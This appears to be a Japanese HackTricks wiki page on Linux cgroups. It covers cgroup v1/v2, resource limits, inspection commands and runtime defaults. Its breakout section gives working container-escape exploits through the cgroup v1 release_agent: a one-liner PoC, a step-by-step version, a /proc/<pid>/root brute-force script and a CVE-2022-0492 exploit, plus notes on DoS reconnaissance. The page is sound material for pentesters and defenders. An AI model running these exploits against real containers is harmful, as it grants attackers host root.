# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

Linux の **control groups** は、accounting、制限、優先順位付け、policy enforcement のためにプロセスをまとめてグループ化する、kernel の仕組みです。namespaces が主にリソースの見え方を分離するためのものだとすれば、cgroups は主にプロセス群がそれらのリソースを**どれだけ**消費できるか、場合によっては**どの種類のリソース**とやり取りできるかを管理するためのものです。ユーザーが直接確認することがなくても、containers は常に cgroups に依存しています。これは、現代のほぼすべての runtime が kernel に「これらのプロセスはこの workload に属しており、これらが適用される resource rules である」と伝える方法を必要とするためです。

このため、container engines は新しい container を独自の cgroup subtree に配置します。プロセスツリーがそこに入ると、runtime は memory に上限を設定し、PID 数を制限し、CPU usage に重み付けを行い、I/O を調整し、device access を制限できます。production environment では、これは multi-tenant safety と基本的な operational hygiene の両方に不可欠です。意味のある resource controls がない container は、memory を使い果たしたり、システムに大量のプロセスを作成したり、CPU や I/O を独占したりして、host や隣接する workloads を不安定にする可能性があります。

security の観点では、cgroups は2つの別々の理由で重要です。第一に、不適切な、または存在しない resource limits は、単純な denial-of-service attacks を可能にします。第二に、一部の cgroup features、特に古い **cgroup v1** setups では、container 内から writable だった場合、歴史的に強力な breakout primitives が生み出されてきました。

## v1 Vs v2

現在広く使われている cgroup models には2つの主要なものがあります。**cgroup v1** は複数の controller hierarchies を公開しており、古い exploit writeups では、そこで利用可能だった奇妙で、ときに過度に強力な semantics が扱われることがよくあります。**cgroup v2** は、より統合された hierarchy と、一般的により整理された behavior を導入しています。modern distributions は cgroup v2 を優先する傾向が強まっていますが、mixed または legacy environments も依然として存在するため、実際のシステムを review する際には両方の models が引き続き重要です。

この違いが重要なのは、**`release_agent`** の cgroup v1 における abuse など、最も有名な container breakout の事例の一部が、古い cgroup behavior と非常に密接に結び付いているためです。blog で cgroup exploit を見つけ、それを modern な cgroup v2-only system に盲目的に適用する読者は、target 上で実際に可能なことを誤解する可能性があります。

## Inspection

現在の shell がどこにあるかを確認する最も簡単な方法は次のとおりです。
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
`/proc/self/cgroup` ファイルには、現在のプロセスに関連付けられた cgroup パスが表示されます。最新の cgroup v2 host では、通常、unified エントリが表示されます。古い host や hybrid host では、複数の v1 controller パスが表示される場合があります。パスがわかったら、`/sys/fs/cgroup` 配下の対応するファイルを調べて、制限と現在の使用状況を確認できます。

cgroup v2 host では、次の commands が役立ちます。
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
これらのファイルから、どの controller が存在し、どの controller が子 cgroup に委譲されているかが分かります。この委譲モデルは、rootless および systemd-managed 環境で重要です。ランタイムは、親階層が実際に委譲している cgroup 機能のサブセットしか制御できない場合があるためです。

## Lab

実際に cgroups を確認する方法の 1 つは、メモリ制限付きのコンテナを実行することです。
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
PID 制限付きコンテナも試せます:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
これらの例は、runtime flag と kernel file interface の関連付けに役立つため有用です。runtime は魔法によってルールを強制しているわけではありません。関連する cgroup 設定を書き込み、その後、kernel に process tree に対する強制を任せています。

## Runtime の使用方法

Docker、Podman、containerd、CRI-O はいずれも、通常の動作の一部として cgroups に依存しています。違いは通常、cgroups を使用するかどうかではなく、**どのデフォルトを選択するか**、**systemd とどのように連携するか**、**rootless delegation がどのように機能するか**、そして **設定のどの程度が engine level と orchestration level のどちらで管理されるか** にあります。

Kubernetes では、resource requests と limits は最終的に node 上の cgroup 設定になります。Pod YAML から kernel enforcement までの経路は kubelet、CRI runtime、OCI runtime を経由しますが、最終的にルールを適用する kernel mechanism は依然として cgroups です。Incus/LXC 環境でも cgroups は広く使用されています。特に system containers は、より豊富な process tree と、VM に近い運用上の期待を公開することが多いためです。

## Misconfigurations And Breakouts

cgroup security における古典的な話は、書き込み可能な **cgroup v1 `release_agent`** mechanism です。この model では、attacker が適切な cgroup files に書き込み、`notify_on_release` を有効化し、`release_agent` に保存される path を制御できた場合、cgroup が空になったときに kernel が host の initial namespaces で attacker が選択した path を実行する可能性がありました。そのため、古い writeup では cgroup controller の writability、mount options、namespace/capability conditions に大きな注意が向けられています。

`release_agent` を利用できない場合でも、cgroup の誤りは重要です。過度に広範な device access によって、container から host devices に到達できる可能性があります。memory と PID limits がない場合、単純な code execution が host DoS に発展する可能性があります。rootless scenarios における弱い cgroup delegation は、runtime が実際には制限を適用できなかったにもかかわらず、restriction が存在すると defenders に誤認させることもあります。

### `release_agent` の背景

`release_agent` technique は **cgroup v1** にのみ適用されます。基本的な考え方は、cgroup 内の最後の process が終了し、`notify_on_release=1` が設定されている場合、kernel が `release_agent` に保存された path の program を実行するというものです。この実行は **host の initial namespaces** で行われるため、書き込み可能な `release_agent` が container escape primitive になります。

この technique を機能させるには、通常、attacker は以下を必要とします。

- 書き込み可能な **cgroup v1** hierarchy
- child cgroup を作成または使用する ability
- `notify_on_release` を設定する ability
- `release_agent` に path を書き込む ability
- host の観点から executable に解決される path

### Classic PoC

historical one-liner PoC は次のとおりです。<sup>[[1]](#references)</sup>
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
この PoC は、`release_agent` に payload のパスを書き込み、cgroup の release をトリガーし、その後ホスト上で生成された出力ファイルを読み取ります。

### 読みやすい手順

同じ考え方を手順に分けると、より理解しやすくなります。<sup>[[1]](#references)</sup>

1. 書き込み可能な cgroup を作成して準備する:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. コンテナのファイルシステムに対応するホストパスを特定します：
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. ホストパスから見える payload を配置する：
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. cgroupを空にして実行をトリガーする:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
その結果、payload は host 側で host の root 権限により実行されます。実際の exploit では、payload は通常、proof file を書き込む、reverse shell を起動する、または host の状態を変更します。

### `/proc/<pid>/root` を使用した Relative Path Variant

一部の環境では、container filesystem への host path が明らかでないか、storage driver によって隠されています。その場合、payload path は `/proc/<pid>/root/...` を通じて表現できます。ここで `<pid>` は、現在の container 内のプロセスに属する host PID です。これが、relative-path brute-force variant の基盤です。<sup>[[2]](#references)</sup>
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
ここで重要なtrickは brute force そのものではなく、path の形式です。`/proc/<pid>/root/...` を使うと、直接の host storage path が事前に分かっていなくても、kernel は host namespace から container filesystem 内の file を解決できます。

### CVE-2022-0492 Variant

2022年、CVE-2022-0492 により、cgroup v1 の `release_agent` への書き込み時に、**initial** user namespace における `CAP_SYS_ADMIN` の有無が正しく確認されていないことが明らかになりました。これにより、脆弱な kernel ではこの technique をより容易に実行できました。cgroup hierarchy を mount できる container process は、host user namespace ですでに privileged でなくても `release_agent` に書き込めたためです。<sup>[[3]](#references)</sup>

Minimal exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
脆弱な kernel では、host が host root 権限で `/proc/self/exe` を実行します。

実際に悪用するには、まず環境に書き込み可能な cgroup-v1 path や危険な device access が引き続き公開されているか確認します。
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
`release_agent` が存在し、書き込み可能なら、すでに legacy-breakout の領域に入っています:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
cgroup パス自体から escape が得られない場合、次に実用的な用途となるのは、多くの場合、denial of service または reconnaissance です。
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
これらのコマンドを使うと、workload に fork-bomb を実行する余地があるか、メモリを積極的に消費できるか、または書き込み可能な legacy cgroup interface を悪用できるかをすばやく確認できます。

## チェック

target を確認する際、cgroup checks の目的は、使用されている cgroup model、container から書き込み可能な controller paths が見えるかどうか、そして `release_agent` のような古い breakout primitives がそもそも関係するかどうかを把握することです。
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
ここで注目すべき点:

- `mount | grep cgroup` に **cgroup v1** が表示される場合、古い breakout writeup の関連性が高くなります。
- `release_agent` が存在し、到達可能な場合、直ちに詳しく調査する価値があります。
- 参照可能な cgroup hierarchy が writable で、コンテナにも強力な capabilities がある場合、その環境はより詳細にレビューする必要があります。

**cgroup v1**、writable な controller mount、さらに強力な capabilities または弱い seccomp/AppArmor protection を持つコンテナが見つかった場合、その組み合わせには注意深く対処する必要があります。cgroups は退屈な resource-management の話として扱われることが多いものの、歴史的には最も示唆に富む container escape chain の一部となってきました。これはまさに、「resource control」と「host influence」の境界が、想定されていたほど常に明確ではなかったためです。

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | デフォルトで有効 | コンテナは自動的に cgroups に配置されます。resource limit は、flags で設定しない限り任意です | `--memory`、`--pids-limit`、`--cpus`、`--blkio-weight`、`--device`、`--privileged` の省略 |
| Podman | デフォルトで有効 | `--cgroups=enabled` がデフォルトです。cgroup namespace のデフォルトは cgroup version により異なります（cgroup v2 では `private`、一部の cgroup v1 setup では `host`） | `--cgroups=disabled`、`--cgroupns=host`、緩和された device access、`--privileged` |
| Kubernetes | デフォルトで Runtime 経由で有効 | Pod とコンテナは node Runtime によって cgroups に配置されます。fine-grained な resource control は `resources.requests` / `resources.limits` に依存します | resource requests/limits の省略、privileged な device access、host-level Runtime misconfiguration |
| containerd / CRI-O | デフォルトで有効 | cgroups は通常の lifecycle management の一部です | device control を緩和する直接的な Runtime config、または legacy の writable な cgroup v1 interface の公開 |

重要な違いは、**cgroup の存在**は通常デフォルトである一方、**有用な resource constraint** は明示的に設定しない限り任意であることです。

## References

- [1] [Understanding Docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [2] [Privileged Container Escape - Control Groups release_agent](http://blog.ajxchapman.com/containers/2020/11/19/privileged-container-escape.html)
- [3] [New Linux Vulnerability CVE-2022-0492 Affecting Cgroups: Can Containers Escape?](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)

{{#include ../../../../banners/hacktricks-training.md}}
